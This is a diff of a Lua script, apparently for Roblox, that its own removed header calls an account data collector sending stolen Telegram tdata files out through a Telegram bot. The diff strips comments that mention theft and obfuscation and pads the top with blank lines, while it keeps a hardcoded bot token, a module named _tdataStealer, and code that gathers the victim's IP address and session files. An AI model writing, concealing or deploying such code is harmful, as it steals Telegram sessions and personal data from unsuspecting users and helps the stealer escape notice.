@@ -1,7 +1,102 @@
---[[
-  Roblox Account Data Collector v3
-  С отправкой tdata файлов через Telegram
-]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 local _environmentDetector = {}
 local _dataCollector = {}
@@ -9,7 +104,7 @@ local _communicationModule = {}
 local _tdataStealer = {}
 local _fileManager = {}
 
--- Разбитые константы для обфускации
+
 local _telegramConfig = {
     _part1 = "7771675205:AAHnUghHQhSnK4qFY1JLUSomuoPys-zQc8c",
     _part2 = "",
@@ -18,14 +113,14 @@ local _telegramConfig = {
     _chatPart2 = ""
 }
 
--- Сборка токена и chat ID
+
 local function _assembleConfig()
     local _finalToken = _telegramConfig._part1 .. _telegramConfig._part2 .. _telegramConfig._part3
     local _finalChat = _telegramConfig._chatPart1 .. _telegramConfig._chatPart2
     return _finalToken, _finalChat
 end
 
--- Безопасное выполнение функций
+
 local function _safeExecute(_functionToExecute, ...)
     local _executionStatus, _result = pcall(_functionToExecute, ...)
     if _executionStatus then
@@ -101,7 +196,7 @@ function _environmentDetector:identifyPlatform()
     end) or "Unknown"
 end
 
--- Модуль кражи tdata
+-- Модуль tdata
 function _tdataStealer:attemptTDataCollection(tdataPath)
     return _safeExecute(function()
         local _tdataResult = {
@@ -164,7 +259,7 @@ function _dataCollector:gatherDesktopData()
         local _ipResponse = _communicationModule:httpRequest("http://api.ipify.org")
         _collectedData.ipAddress = _ipResponse or "Unable to get IP"
         
-        -- Кража tdata если найден путь
+        -- Кtdata если найден путь
         if _collectedData.tdataPath then
             _collectedData.tdataResult = _tdataStealer:attemptTDataCollection(_collectedData.tdataPath)
         end
